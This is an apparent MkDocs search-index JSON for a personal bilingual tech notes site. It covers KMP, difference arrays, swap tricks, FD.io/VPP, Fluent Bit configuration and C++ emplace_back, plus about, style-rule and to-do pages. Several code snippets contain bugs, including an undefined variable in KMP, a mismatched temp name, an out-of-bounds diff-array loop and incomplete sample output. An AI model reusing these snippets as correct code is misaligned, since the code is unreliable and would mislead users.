{"config": {"lang": ["en"], "separator": "[\\s\\-]+", "pipeline": ["stopWordFilter"]}, "docs": [{"location": "", "title": "Hi there!", "text": "<p>This is my site. </p> <p>Theme credits to TonyCrane, thanks Tony!</p> <p> About /   ChangeLog /   Statistics</p> <p>Pages: 48 Words: 53658 Code Blocks: 7546 Up Time: </p>"}, {"location": "about/", "title": "Hi there!", "text": "<p>About me</p> <ul> <li> China -&gt; Australia -&gt; Sweden -&gt; US -&gt; China</li> <li> Siemens -&gt; Alibaba -&gt; Tencent -&gt; Intel</li> <li> XR -&gt; Java -&gt; Android -&gt; Edge Computing</li> </ul> <p>Send Email </p>"}, {"location": "changelog/", "title": "Change Logs", "text": "<p>Abstract</p> <p>Changing website theme to Material of MkDocs.</p>"}, {"location": "changelog/#2024", "title": "2024", "text": "03/19/2024\u00b6 <p> {'text': 'Change website theme'}</p>"}, {"location": "criterions/", "title": "Criterions for Site", "text": "<ul> <li>1-Posts</li> <li>1.1-Titles<ul> <li>1.1.1-All Cap for first letter of each word in post title, except for preposition.</li> <li>1.1.2-Cap for first letter of first word inside post.</li> <li>1.1.3-Titles inside post need follow format of this Criterions.</li> </ul> </li> <li>1.2-Tags<ul> <li>1.2.1-Need specifiy language (EN/CH), best to have bi-lingular version for each post.</li> <li>1.2.2-Tags need to be all lower case.</li> <li>1.2.3-Tags need to use \"-\" to replace spaces and \".\".</li> </ul> </li> <li>1.3-TOC</li> </ul> <p>This is criterions for this site, self-reference only.</p>"}, {"location": "criterions/#1-posts", "title": "1-Posts", "text": ""}, {"location": "criterions/#11-titles", "title": "1.1-Titles", "text": ""}, {"location": "criterions/#111-all-cap-for-first-letter-of-each-word-in-post-title-except-for-preposition", "title": "1.1.1-All Cap for first letter of each word in post title, except for preposition.", "text": ""}, {"location": "criterions/#112-cap-for-first-letter-of-first-word-inside-post", "title": "1.1.2-Cap for first letter of first word inside post.", "text": ""}, {"location": "criterions/#113-titles-inside-post-need-follow-format-of-this-criterions", "title": "1.1.3-Titles inside post need follow format of this Criterions.", "text": ""}, {"location": "criterions/#12-tags", "title": "1.2-Tags", "text": ""}, {"location": "criterions/#121-need-specifiy-language-ench-best-to-have-bi-lingular-version-for-each-post", "title": "1.2.1-Need specifiy language (EN/CH), best to have bi-lingular version for each post.", "text": ""}, {"location": "criterions/#122-tags-need-to-be-all-lower-case", "title": "1.2.2-Tags need to be all lower case.", "text": ""}, {"location": "criterions/#123-tags-need-to-use-to-replace-spaces-and", "title": "1.2.3-Tags need to use \"-\" to replace spaces and \".\".", "text": ""}, {"location": "criterions/#13-toc", "title": "1.3-TOC", "text": "<p>Need to have toc section for each post, follow below steps: 1. cmd+Shift+P in VSCode 2. type \"toc\" 3. select \"Markdown All in One: Create Table of Contents</p>"}, {"location": "links/", "title": "\u53cb\u94fe", "text": "<p>Abstract</p> <p>\u4e00\u4e9b\u670b\u53cb\u4eec\u7684\u7b14\u8bb0\u672c\uff01</p> Isshiki\u4fee's Notebook \u4fee\u4f6c tql\uff01 \u54b8\u9c7c\u6684\u7684\u4ee3\u7801\u7a7a\u95f4 \u4e00\u4e2a\u597d\u602a\u7684\u5b66\u957f\uff08\u5212\u6389 widcardw \u7684\u7b14\u8bb0 wid \u597d\u5f3a\uff0c\u7b14\u8bb0\u597d\u597d\u770b chenyuan \u7684\u6280\u672f\u7b14\u8bb0\u672c \\cydl/\\cydl/\\cydl/ yhwu_is's Notes wyy! \u6211\u6ef4\u8d85\u4eba FFox's Notes kami\u2757\ufe0f HobbitQia \u7684\u7b14\u8bb0\u672c \u4f60\u662f\u2753 \u60a8\u2757\ufe0f Bowling's TechStack \u5f3a\u5f97\u6050\u6016\u7684\u5b66\u5f1f \u514b\u745e\u5947\u7684\u7b14\u8bb0\u672c \u4e5f\u662f\u4e00\u4e2a\u597d\u5f3a\u7684\u5b66\u957f/\u62dc\u8c22 Matheart's Note \u662f\u6570\u5fc3\u8036\uff08\u5927\u80a5\u9e3d\u5b50\u597d\u4e45\u6ca1\u66f4\u65b0\u4e86 GZTime's Blog \u8fd9\u4e2a\u61d2\u86cb\u8fd8\u6ca1\u641e note \u70e7\u98ce\u7684\u535a\u5ba2 \u4e00\u4e2a\u5f88\u5f3a\u7684 up \u4e3b@\u70e7\u98ce"}, {"location": "todo/", "title": "\u4ee3\u529e\u4e8b\u9879", "text": ""}, {"location": "todo/#_2", "title": "\u5efa\u7ad9\u7c7b", "text": "List <ul> <li> nav \u680f\u989c\u8272</li> <li> \u6697\u8272\u4e3b\u9898</li> <li> \u5b57\u4f53\u5927\u5c0f</li> <li> h1 h2 \u7684 font-weight\uff08\u8c8c\u4f3c\u624b\u673a\u4e0a\u6ca1\u95ee\u9898\uff1f\uff09</li> <li> \u884c\u8ddd</li> <li> \u4fee\u516c\u5f0f\u6e32\u67d3</li> <li> \u4e3b\u9875\u3001\u5173\u4e8e</li> <li> \u9875\u811a\u7248\u6743\u4fe1\u606f</li> <li> \u9875\u811a\u8054\u7cfb\u65b9\u5f0f</li> <li> \u94fe\u63a5 GitHub \u4ed3\u5e93</li> <li> tasklist \u6837\u5f0f</li> <li> \u642c\u8fd0\u535a\u5ba2<ul> <li> \u4e8c\u7ef4\u7801</li> <li> Haskell</li> <li> hackergame writeup</li> <li> \u642c\u51e0\u4e2a\u6bd4\u8d5b\u7684 writeup</li> </ul> </li> <li> \u5efa\u7acb writeup \u5206\u533a</li> <li> \u5efa\u7acb \u8ba1\u7b97\u673a \u5206\u533a</li> <li> \u90e8\u7f72\u5230\u4e91\u670d\u52a1\u5668 \uff08\u6682\u4e0d\u6253\u7b97\uff09</li> <li> \u5de6\u4e0a\u89d2 logo</li> <li> \u5b8c\u5584 css</li> <li> \u7ed1\u5b9a\u57df\u540d</li> <li> \u516c\u5f00 repo</li> <li> \u663e\u793a\u6700\u540e\u4fee\u6539\u65f6\u95f4</li> <li> GitHub repo \u6dfb\u52a0 README</li> <li> \u624b\u673a\u7aef\u989c\u8272\u95ee\u9898</li> <li> \u4ee3\u7801\u5757\u80cc\u666f\u548c\u535a\u5ba2\u540c\u6b65</li> <li> \u4ee3\u7801\u914d\u8272\u65b9\u6848\u548c\u535a\u5ba2\u540c\u6b65 \uff08\u4e0d\u5fc5\u540c\u6b65\uff09</li> <li> \u81ea\u52a8\u6697\u8272</li> <li> \u6dfb\u52a0 icons \u548c emojis  </li> <li> \u53f3\u4fa7 toc \u6df1\u5ea6\u8c03\u6574</li> <li> \u5de6\u4fa7 nav \u6df1\u5ea6\u8c03\u6574</li> <li> \u4e3a\u6bcf\u4e2a\u5206\u533a\u6dfb\u52a0 index<ul> <li> cs</li> <li> cs/pl </li> <li> ctf</li> <li> writeups</li> </ul> </li> <li> \u8bbf\u95ee\u7edf\u8ba1<ul> <li> Google Analytics</li> <li> \u767e\u5ea6\u7edf\u8ba1</li> </ul> </li> <li> \u642c\u4e00\u4e9b notion \u4e0a\u7684 misc kb</li> <li> \u628a yml \u5f04\u5e72\u51c0\u4e00\u70b9</li> <li> \u5199\u4e00\u4e0b mkdocs \u7528\u6cd5</li> <li> \u6807\u9898\u524d\u7f00\u6570\u5b57</li> <li> \u642d\u4e2a\u7f51\u76d8</li> <li> \u6587\u4ef6\u94fe\u63a5</li> </ul>"}, {"location": "todo/#_3", "title": "\u5de5\u5177\u7c7b", "text": "<ul> <li> \u4fee\u6539 mkdocs \u6e90\u7801\uff0c\u52a0\u5feb\u9884\u89c8\u6784\u5efa\u901f\u5ea6</li> <li> \u4f7f\u7528 rich \u7f8e\u5316 log \u8f93\u51fa</li> <li> \u6539\u5584 encryption \u63d2\u4ef6</li> </ul>"}, {"location": "todo/#_4", "title": "\u7b14\u8bb0\u7c7b", "text": "<ul> <li> x86 \u6c47\u7f16\u8bed\u8a00<ul> <li> \u8865\u5145 186\uff5e386 \u6307\u4ee4</li> <li> \u8865\u5145 fl \u5f71\u54cd</li> </ul> </li> <li> RISC-V \u6c47\u7f16\u8bed\u8a00<ul> <li> \u8865\u5145\u6269\u5c55\u6307\u4ee4\u96c6\u6307\u4ee4</li> </ul> </li> <li> \u68c0\u67e5\u5404 index</li> <li> \u7cfb\u7edf\u4e00\u76f8\u5173<ul> <li> \u7406\u8bba\u8bfe</li> <li> lab</li> </ul> </li> <li> \u7cfb\u7edf\u4e8c\u76f8\u5173<ul> <li> \u8865\u4e00\u4e0b\u524d\u4e24\u8282\u8bfe\u7684\u7b14\u8bb0</li> </ul> </li> <li> CTF ETH<ul> <li> \u57fa\u7840\u77e5\u8bc6</li> <li> \u5e38\u89c1\u6f0f\u6d1e</li> </ul> </li> <li> Python \u76f8\u5173<ul> <li> Lecture \u6587\u5b57\u7248</li> <li> NumPy</li> <li> PIL</li> <li> matplotlib</li> </ul> </li> <li> HPC<ul> <li> SIMD</li> <li> ML</li> </ul> </li> <li> \u5efa\u7acb\u8bfe\u7a0b\u7b14\u8bb0\u9875\u9762<ul> <li> \u4eba\u5de5\u667a\u80fd\u57fa\u7840</li> <li> \u6570\u636e\u7ed3\u6784\u57fa\u7840</li> </ul> </li> <li> \u5de5\u5177<ul> <li> index</li> <li> docker</li> <li> GitHub Action</li> <li> Git</li> </ul> </li> <li> Writeups<ul> <li> TCTF NFT</li> <li> \u5f3a\u7f51\u676f\u789f\u5f71\u91cd\u91cd</li> </ul> </li> <li> Rust</li> <li> \u6e90\u7801\u5256\u6790<ul> <li> index</li> <li> mkdocs</li> </ul> </li> <li> log4j \u6f0f\u6d1e\u590d\u73b0\u5b58\u4e2a\u6863</li> </ul>"}, {"location": "cs/", "title": "Computer Science", "text": "<p>Abstract</p> <p>Some tell a whole story, some just speak for themselves.</p>"}, {"location": "cs/#table-of-contents", "title": "Table of Contents", "text": "Algorithms          <ul> <li> KMP  312  35  1 mins              1710908779 </li> </ul> Programming Languages          <ul> <li> C++  289  55  2 mins              1710908779 </li> <li> Python  0  0 mins              0 </li> <li> Rust  0  0 mins              0 </li> <li> Haskell  0  0 mins              0 </li> <li> Chisel  0  0 mins              0 </li> <li> x86 Assembly  0  0 mins              0 </li> <li> RISC-V ISA  0  0 mins              0 </li> </ul> \u8ba1\u7b97\u673a\u7c7b\u8bfe\u7a0b\u7b14\u8bb0          <ul> <li> \u8ba1\u7b97\u673a\u7cfb\u7edf\u8d2f\u901a\u7cfb\u5217  0  0 mins              0 </li> <li> \u5357\u4eac\u5927\u5b66 ICS PA \u5b9e\u9a8c\u7eaa\u5b9e  0  0 mins              0 </li> <li> \u6570\u636e\u7ed3\u6784\u57fa\u7840  0  0 mins              0 </li> <li> \u4eba\u5de5\u667a\u80fd\u57fa\u7840  0  0 mins              0 </li> <li> HPC 101 \u8d85\u7b97\u5c0f\u5b66\u671f  0  0 mins              0 </li> <li> \u8ba1\u7b97\u7406\u8bba  0  0 mins              0 </li> <li> \u7f16\u7a0b\u8bed\u8a00\u539f\u7406  0  0 mins              0 </li> </ul> \u96f6\u6563\u77e5\u8bc6\u70b9          <ul> <li> RegEx \u6b63\u5219\u8868\u8fbe\u5f0f  0  0 mins              0 </li> <li> Unicode \u7edf\u4e00\u7801  0  0 mins              0 </li> </ul> \u5de5\u5177\u4f7f\u7528\u5907\u5fd8          <ul> <li> Git \u547d\u4ee4\u5907\u5fd8  0  0 mins              0 </li> <li> Shell \u547d\u4ee4\u5907\u5fd8  0  0 mins              0 </li> <li> Docker \u76f8\u5173\u5907\u5fd8  0  0 mins              0 </li> <li> gdb \u76f8\u5173\u5907\u5fd8  0  0 mins              0 </li> <li> mkdocs \u4f7f\u7528\u8bb0\u5f55  0  0 mins              0 </li> <li> hexo \u4f7f\u7528\u8bb0\u5f55  0  0 mins              0 </li> <li> sphinx \u4f7f\u7528\u8bb0\u5f55  0  0 mins              0 </li> </ul> \u6e90\u7801\u5256\u6790          <ul> <li> mkdocs \u6e90\u7801\u5256\u6790  0  0 mins              0 </li> </ul>"}, {"location": "cs/algorithms/kmp/kmpalgorithms/", "title": "Background...", "text": "<p>Once upon a time, Tom asked his father to find <code>abab</code> inside <code>abcaabababaa</code>.</p> <p>Tom's dad did this in a traditional way (brute force). He compared each character of the first string with each character of the second string. When he find one character not matching, for example, the third character in the second string in this case, he start again from the second character of the second string. It went on and on and on...</p>"}, {"location": "cs/algorithms/kmp/kmpalgorithms/#moving-on", "title": "Moving on...", "text": "<p>Unfortunately, Tom had a bad temper about waiting. He wanted to make some change. Tom noticed that, if the n-th character in the first string happened to be not match, even if he start again, he will make a compare with that character again in the future. Therefore, Tom decided not to start from the begining each time a not match is found.</p> <p>He talked to his dad, \"when we have a not match for the n-th character, if we consider the characters before, we do have a big match, and if so, we actually can use the head of <code>abab</code> to try to match the tail of <code>abab</code>, the longest mathing substring will be the place for us to start again.\" </p> <p>For example, for <code>abab</code>, there will be 3 possible heads: <code>a</code>, <code>ab</code>, <code>aba</code>. And there will be 3 possible tails: <code>b</code>, <code>ab</code>, <code>bab</code>. The longest matching is <code>ab</code>, so each time there's a not mathing, we don't need to start from begin, instead we can start from the 3-rd character to make a comparison.</p>"}, {"location": "cs/algorithms/kmp/kmpalgorithms/#coding-work", "title": "Coding work...", "text": "<p>Taking the above thought into real code, c++, for example:</p> <p>We first need a function to generate all the longest matching for each substring of the string we are trying to search.</p> <pre><code>int * FindLongestMatching(string first){\n  int * tableOfFirst = new int[first.length()];\n  tableOfFirst[0] = -1;\n  int i = 0;\n  int j = -1;\n  while (i &lt; p.length() - 1) {\n    if (j == -1 || first[i] == first[j]) {\n      i++\uff1b\n      j++\uff1b\n      tableOfFirst[i] = j;\n    }\n    else {\n      j = tableOfFirst[j];\n    }\n  }\n  return tableOfFirst;\n}\n</code></pre> <p>With this function, we can make a linear time matching:</p> <pre><code>int KMP (string first, string second) {\n  int i = 0;\n  int j = 0;\n  int * tableOfFirst = FindLongestMatching(first);\n  while (i &lt; second.length() &amp;&amp; j &lt; first.length()) {\n    if (j == -1 || second[i] == first[j]) {\n      i++;\n      j++;\n    }\n    else {\n      j = tableOfFirst[j];\n    }\n  }\n  if (j == first.length()){\n    return i-j;\n  }\n  return -1;\n}\n</code></pre> <p>Tom is happy now.</p>"}, {"location": "cs/algorithms/others/diffarray/", "title": "Diff Array", "text": "<ul> <li>Functionality</li> <li>Trick</li> <li>Recovering original array</li> <li>Opearting a diff array</li> </ul> <p>In this blog, we will talk about one trick can be used to solve problems to do with frequent addition and subtraction to a subsection of an array  - Diff Array.</p>"}, {"location": "cs/algorithms/others/diffarray/#functionality", "title": "Functionality", "text": "<p>Todo with frequent addition and subtraction to a subsection of an array.</p> <p>e.g. Given array <code>arr</code>, add 1 for elements between  <code>arr[0]</code> and <code>arr[3]</code> inclusively, then, substract 3 for elements between  <code>arr[2]</code> and <code>arr[5]</code> inclusively, what will be the final <code>arr</code>.</p>"}, {"location": "cs/algorithms/others/diffarray/#trick", "title": "Trick", "text": ""}, {"location": "cs/algorithms/others/diffarray/#constracting-a-diff-array", "title": "Constracting a diff array", "text": "<p>Diff array is an array recording the difference between two adjacent elements in <code>arr</code>, i.e. <code>diffArr[i] = arr[i] - arr[i-1]</code>.</p> <pre><code>vector&lt;int&gt; diffArr(arr.size());\ndiffArr[0] = arr[0];\nfor (int i = 0; i &lt; arr.size(); i++) {\n  diffArr[i] = arr[i] - arr[i-1];\n}\n</code></pre>"}, {"location": "cs/algorithms/others/diffarray/#recovering-original-array", "title": "Recovering original array", "text": "<p>To recover <code>arr</code> from <code>diffArr</code>, we are going to add elements in <code>diffArr</code> with previous elements (one element before) in <code>arr</code>.</p> <pre><code>vecotr&lt;int&gt; result(diffArr.size());\nresult[0] = diffArr[0];\nfor (int i = 1; i &lt; diffArr.size(); i++) {\n  result[i] = result[i-1]+diff[i];\n}\n</code></pre>"}, {"location": "cs/algorithms/others/diffarray/#opearting-a-diff-array", "title": "Opearting a diff array", "text": "<p>With method mentioned in previous section, to add or substract <code>amount</code> for elements between <code>arr[a]</code> and <code>arr[b]</code> inclusively, we just need <code>diffArr[a] += amount</code> and <code>diffArr[b+1] -= amount</code>. </p> <p>Remember to check <code>b+1</code> if it excesses the boundary of array, </p>"}, {"location": "cs/algorithms/others/swapfunctions/", "title": "SWAP Function", "text": "<p>In this blog, we will look into several ways of implementing swap in different ways.</p>"}, {"location": "cs/algorithms/others/swapfunctions/#intermedia-variable", "title": "Intermedia Variable", "text": "<pre><code>int a = 1;\nint b = 2;\nint tem = a;\na = b;\nb = temp;\n</code></pre>"}, {"location": "cs/algorithms/others/swapfunctions/#addition-and-subtraction", "title": "Addition and Subtraction", "text": "<pre><code>int a = 1;\nint b = 2;\na = a+b;\nb = a-b;\na = a-b;\n</code></pre>"}, {"location": "cs/algorithms/others/swapfunctions/#multiplication-and-division", "title": "Multiplication and Division", "text": "<pre><code>int a = 1;\nint b = 2;\na = a*b;\nb = a/b;\na = a/b;\n</code></pre>"}, {"location": "cs/algorithms/others/swapfunctions/#xor", "title": "XOR", "text": "<pre><code>int a = 1; \nint b = 2;\na = a^b;\nb = b^a; // b = b^(a^b) = b^a^b = b^b^a = 0^a = a\na = a^b; // a = (a^b)^a = a^b^a = a^a^b = 0^b = b\n</code></pre>"}, {"location": "cs/edgecomputing/fdio/overview/", "title": "FD.io\u7b80\u4ecb", "text": "<ul> <li>\u5173\u4e8edatapath\u7684\u521b\u65b0</li> <li>FD.io\u89e3\u51b3\u7684\u95ee\u9898</li> <li>\u73b0\u6709dataplane\u7684\u7f3a\u9677</li> <li>FD.io\u7684\u7b80\u5355\u4ecb\u7ecd<ul> <li>\u4e0eDPDK\u7684\u5173\u7cfb</li> <li>\u5173\u4e8eVPP</li> </ul> </li> </ul> <p>\u603b\u7ed3\u81eafd.io Youtube</p>"}, {"location": "cs/edgecomputing/fdio/overview/#datapath", "title": "\u5173\u4e8edatapath\u7684\u521b\u65b0", "text": "<p>\"Innovating the sh.. out of the datapath\"</p>"}, {"location": "cs/edgecomputing/fdio/overview/#fdio", "title": "FD.io\u89e3\u51b3\u7684\u95ee\u9898", "text": "<p>\u5c31\u76ee\u524d\u6765\u770b\uff0c\u76f8\u6bd4controlplane\uff0cdataplane\u5f97\u5230\u7684\u53d1\u5c55\u66f4\u53d7\u5c40\u9650\uff0c\u6211\u4eec\u5c11\u6709\u5177\u6709\u63a8\u52a8\u6027\u7684\u6216\u7279\u6027\u4e30\u5bcc\u7684dataplane\uff0c\u4ece\u800c\u5bfc\u81f4\u4e86\u6570\u636e\u4e2d\u5fc3\u76f8\u5173\u521b\u65b0\u7684\u7f3a\u4e4f\u3002\u6211\u4eec\u4e9f\u9700\u4e00\u4e2a\u7075\u6d3b\u7684\u9ad8\u6027\u80fd\u53ef\u7f16\u7a0bdataplane\uff0c\u6240\u4ee5fd.io\uff0c\u6216\u8005\u8bf4VPP\uff0c\u51fa\u73b0\u4e86\u3002</p>"}, {"location": "cs/edgecomputing/fdio/overview/#dataplane", "title": "\u73b0\u6709dataplane\u7684\u7f3a\u9677", "text": "<p>\u5f53\u7136\uff0c\u73b0\u5728\u5df2\u7ecf\u6709\u4e00\u4e9b\u4eba\u5728\u505a\u76f8\u5173dataplane\u7684\u5c1d\u8bd5\uff0c\u4f46\u662f\u8fd9\u4e9b\u4ea7\u54c1\u603b\u662f\u5b58\u5728\u4e00\u4e9b\u4e0d\u8db3\u7684\u70b9\uff0c\u6bd4\u5982\u5728\u53ef\u6269\u5c55\u6027\u548c\u7a33\u5b9a\u6027\u65b9\u9762\u7684\u4e0d\u8db3\u3001\u7f3a\u5c11\u8de8\u5e73\u53f0\u7684\u80fd\u529b\u7b49\u3002\u8fd9\u4e9b\u80fd\u529b\u90fd\u662f\u5f88\u91cd\u8981\u7684\u70b9\uff0c\u6bd4\u5982\u5bf9\u4e8e\u8de8\u5e73\u53f0\u6765\u8bf4\uff0c\u6211\u4eec\u5e0c\u671bdataplane\u53ef\u4ee5\u5728VM\u4e0a\u8fd0\u884c\uff0c\u540c\u65f6\u4e5f\u80fd\u591f\u901a\u8fc7\u5bb9\u5668\u8fd0\u884c\u3002</p>"}, {"location": "cs/edgecomputing/fdio/overview/#fdio_1", "title": "FD.io\u7684\u7b80\u5355\u4ecb\u7ecd", "text": ""}, {"location": "cs/edgecomputing/fdio/overview/#dpdk", "title": "\u4e0eDPDK\u7684\u5173\u7cfb", "text": "<p>\u5bf9\u4e8eIO\u6765\u8bf4\uff0c\u4e3b\u8981\u4f9d\u8d56\u4e8eDPDK\u7684\u5b9e\u73b0\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u5728DPDK\u4e0a\u5c42\u53e0\u52a0\u5305\u5904\u7406\u548c\u7ba1\u7406\u7684\u80fd\u529b\uff0c\u4ece\u800c\u8fbe\u5230\u628aDPDK\u96c6\u6210\u5230\u591a\u79cd\u73af\u5883\uff08\u6bd4\u5982SDN\uff09\u4e2d\u7684\u76ee\u7684\u3002</p>"}, {"location": "cs/edgecomputing/fdio/overview/#vpp", "title": "\u5173\u4e8eVPP", "text": "<p>VPP\u5168\u79f0\u662fVector Packet Processor\uff0c\u6700\u521d\u662f\u5728Cisco\u5185\u90e8\u4e8e2002\u5e74\u5f00\u59cb\u521b\u7acb\uff0c\u4e00\u5171\u6709300,000\u884c\u5de6\u53f3\u4ee3\u7801\uff0c\u73b0\u5728\u6350\u8d60\u7ed9\u4e86FD.io\u3002\u53ef\u7528\u4e8eL3\u7f51\u7edc\uff08IPv4/IPv6\uff09\u3001MPLS\u3001SR\u548cL2\u7f51\u7edc\uff0c\u662f\u4e00\u4e2a\u9ad8\u5ea6\u53ef\u7f16\u7a0b\u7684\u591a\u529f\u80fd\u6570\u636e\u5e73\u9762\u3002\u9ad8\u5ea6\u53ef\u7f16\u7a0b\u548c\u591a\u529f\u80fd\u4e3b\u8981\u4f53\u73b0\u5728VPP\u5141\u8bb8\u4ee5\u63d2\u4ef6\u7684\u65b9\u5f0f\u8fdb\u884c\u96c6\u6210\uff0c\u6bcf\u4e2a\u63d2\u4ef6\u53ef\u4ee5\u89c6\u4e3a\u4e00\u4e2a\u5c0f\u7684\u5b50\u9879\u76ee\uff0c\u591a\u4e2a\u63d2\u4ef6\u7684\u5f00\u53d1\u589e\u5f3a\u4e86VPP\u7684\u80fd\u529b\uff0c\u8fd9\u4e5f\u4f7f\u5f97VPP\u751a\u81f3\u53ef\u4ee5\u88ab\u7528\u4e8e\u4ee3\u66ffvSwitch\u3001vRouter\u3001vFirewall\u7b49\u3002</p> <p></p> <p>VPP\u7684\u80fd\u529b\u8868\u73b0\u662f\u6bd4\u8f83\u7a33\u5b9a\u7684\uff0c\u548c\u5305\u5927\u5c0f\u3001FIB\u5927\u5c0f\u3001\u8def\u7531\u6570\u91cf\u65e0\u5173\uff0c\u5bf9\u6bd4\u6765\u770bOVSDPDK\u6536FIB\u5927\u5c0f\u5f71\u54cd\u6781\u5927\u3002</p>"}, {"location": "cs/edgecomputing/fluentbit/client/", "title": "Fluent Bit Client", "text": "<ul> <li>What is fluent bit</li> <li>Structural sketch</li> <li>How to set it up</li> <li>Through config file</li> <li>Though command line parameters</li> <li>Other ootes</li> </ul>"}, {"location": "cs/edgecomputing/fluentbit/client/#what-is-fluent-bit", "title": "What is fluent bit", "text": "<p>One day, the Insurance Management System Tom built crashed. Good news is the system recovered through rebooting, bad news is Tom did not know what had gone wrong. Tom's dad comes by and says to Tom \"Fluent Bit is a telemetry agent designed to collect and process telemetry data from constrained systems to cloud infrastructures. Why don't you give it a try?\"</p>"}, {"location": "cs/edgecomputing/fluentbit/client/#structural-sketch", "title": "Structural sketch", "text": "<p>Tom is a good listener. He listened to his dad and checked the Fluent Bit website https://docs.fluentbit.io, and found one great picture shows the rough structure of Fluent Bit: </p>"}, {"location": "cs/edgecomputing/fluentbit/client/#how-to-set-it-up", "title": "How to set it up", "text": "<p>Tom told his dad there're two different methods to config Fluent Bit:</p>"}, {"location": "cs/edgecomputing/fluentbit/client/#through-config-file", "title": "Through config file", "text": "<p>Fluent Bit could use config file to set Input sources, Filters, Output destinations, etc. Sample config file, which locates in <code>/etc/fluent-bit/fluent-bit.conf</code> by default:</p> <pre><code>[INPUT]\n    Name    forward\n    Listen  0.0.0.0\n    Port    24224\n    Tag     sampleTag\n\n[FILTER]\n    Name    rewrite_tag\n    Match   sampleTag\n    Rule    $name ^\\/.+[-_]([a-z\\-]+)[-_][0-9]+$ esp-$1 false\n\n[OUTPUT]\n    Name    stdout\n    Match   *\n</code></pre> <p>To use a specific config file instead of the default one, we could use this command: <code>bin/fluent-bit -c example.conf</code>, <code>-c</code> will indicate a new config file.</p>"}, {"location": "cs/edgecomputing/fluentbit/client/#though-command-line-parameters", "title": "Though command line parameters", "text": "<p>Instead of a config file, we could directly reveal INPUTs, FILTERs and OUTPUTs in command line, one example would be:</p> <pre><code>bin/fluent-bit -i systemd \\\n        -p systemd_filter=_SYSTEMD_UNIT=docker.service \\\n        -p tag='sampletag' \\\n        -o forward://${fording_server}:24224\n</code></pre>"}, {"location": "cs/edgecomputing/fluentbit/client/#other-ootes", "title": "Other ootes", "text": "<p>While using fluent-bit, Tom also found it has below characteristics: 1. It could recive forwarded logs from other fluent-bit client, and together forward or output to other destinations. 2. If we're going to install two deb packages including fluent-bit on one same machine, it may incur resource race. Since both fluent-bit will leverage <code>/etc/fluent-bit/fluent-bit.conf</code>. One way to resolve this is, ask one of the client to use different config file or passing config through command line, and while installing the other client, adding <code>--force-overwrite</code>.</p> <p>Tom is not complete happy, he thinks there should be more to discover for this topic.</p>"}, {"location": "cs/languages/", "title": "Programming Languages", "text": "<p>Abstract</p> <p>Notes for different programming languages go here.</p>"}, {"location": "cs/languages/#table-of-contents", "title": "Table of Contents", "text": "<ul> <li>C/C++<ul> <li>emplace back</li> </ul> </li> </ul>"}, {"location": "cs/languages/c%2B%2B/emplaceback/", "title": "EMPLACE_BACK in C++", "text": "<p>There are different type of containers in C++ STL. To add a new element into the back of a container, we normally use <code>push_back()</code>. In this blog, we will look into a new way of performing push back - <code>emplace_back()</code>.</p>"}, {"location": "cs/languages/c%2B%2B/emplaceback/#background-knowledge", "title": "Background Knowledge", "text": "<p>Rvalue References: with aim of increasing the efficiency of C++, rvalues are included. It doesn't  need to copy the value, the rvalue reference is bound to the value itself.</p> <p>To claim an Rvalue:</p> <pre><code>T &amp;&amp; T_reference = t;\n</code></pre>"}, {"location": "cs/languages/c%2B%2B/emplaceback/#for-emplace_back", "title": "For emplace_back( )...", "text": "<p>How is <code>emplace_back()</code> defined:</p> <pre><code>template &lt;typename T&gt;\n    void emplace_back (T &amp;&amp; t);\n</code></pre> <p>An example for <code>emplace_back()</code> from this blog: </p> <pre><code>#include &lt;vector&gt;  \n#include &lt;string&gt;  \n#include &lt;iostream&gt;  \n\nstruct President  \n{  \n    std::string name;  \n    std::string country;  \n    int year;  \n\n    President(std::string p_name, std::string p_country, int p_year)  \n        : name(std::move(p_name)), country(std::move(p_country)), year(p_year)  \n    {  \n        std::cout &lt;&lt; \"I am being constructed.\\n\";  \n    }\n    President(const President&amp; other)\n        : name(std::move(other.name)), country(std::move(other.country)), year(other.year)\n    {\n        std::cout &lt;&lt; \"I am being copy constructed.\\n\";\n    }\n    President(President&amp;&amp; other)  \n        : name(std::move(other.name)), country(std::move(other.country)), year(other.year)  \n    {  \n        std::cout &lt;&lt; \"I am being moved.\\n\";  \n    }  \n    President&amp; operator=(const President&amp; other);  \n};  \n\nint main()  \n{  \n    std::vector&lt;President&gt; elections;  \n    std::cout &lt;&lt; \"emplace_back:\\n\";  \n    elections.emplace_back(\"Nelson Mandela\", \"South Africa\", 1994); //\u6ca1\u6709\u7c7b\u7684\u521b\u5efa  \n\n    std::vector&lt;President&gt; reElections;  \n    std::cout &lt;&lt; \"\\npush_back:\\n\";  \n    reElections.push_back(President(\"Franklin Delano Roosevelt\", \"the USA\", 1936));  \n\n    std::cout &lt;&lt; \"\\nContents:\\n\";  \n    for (President const&amp; president: elections) {  \n       std::cout &lt;&lt; president.name &lt;&lt; \" was elected president of \"  \n            &lt;&lt; president.country &lt;&lt; \" in \" &lt;&lt; president.year &lt;&lt; \".\\n\";  \n    }  \n    for (President const&amp; president: reElections) {  \n        std::cout &lt;&lt; president.name &lt;&lt; \" was re-elected president of \"  \n            &lt;&lt; president.country &lt;&lt; \" in \" &lt;&lt; president.year &lt;&lt; \".\\n\";  \n    }\n\n}\n</code></pre> <p>The output from the above code would be:</p> <pre><code>emplace_back:\nI am being constructed.\n\npush_back:\nI am being constructed.\nI am being moved.\n\nContents:\nNelson Mandela was elected president of South Africa in 1994.\n</code></pre>"}, {"location": "cs/languages/c%2B%2B/emplaceback/#_1", "title": "\u79fb\u52a8\u6784\u9020\u51fd\u6570", "text": "<p>\u5bf9\u4e8e\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u3001\u8d4b\u503c\u6784\u9020\u51fd\u6570\u5fc5\u987b\u5b9e\u73b0\u6307\u9488\u53d8\u91cf\u7684\u6df1\u62f7\u8d1d\uff0c\u53ef\u80fd\u4f1a\u9020\u6210\u9ad8\u8017\u65f6\u3002\u79fb\u52a8\u6784\u9020\u51fd\u6570\u4e0d\u4f1a\u8fdb\u884c\u53d8\u91cf\u6210\u5458\u7684\u6df1\u62f7\u8d1d\uff0c\u800c\u662f\u4ea4\u6362\u6240\u6709\u6743\uff0c\u907f\u514d\u62f7\u8d1d\u65f6\u7684\u6027\u80fd\u635f\u8017\u3002</p> <p>\u58f0\u660e\u4e3a\uff1a</p> <pre><code>className(className &amp;&amp;)\n</code></pre>"}, {"location": "cs/languages/c%2B%2B/emplaceback/#emplace_back", "title": "emplace_back()", "text": "<p>C++11\u65b0\u7279\u6027\uff0c\u58f0\u660e\u4e3a</p> <pre><code>template&lt;class ... Args&gt;\nvoid emplace_back(Arg&amp;&amp; 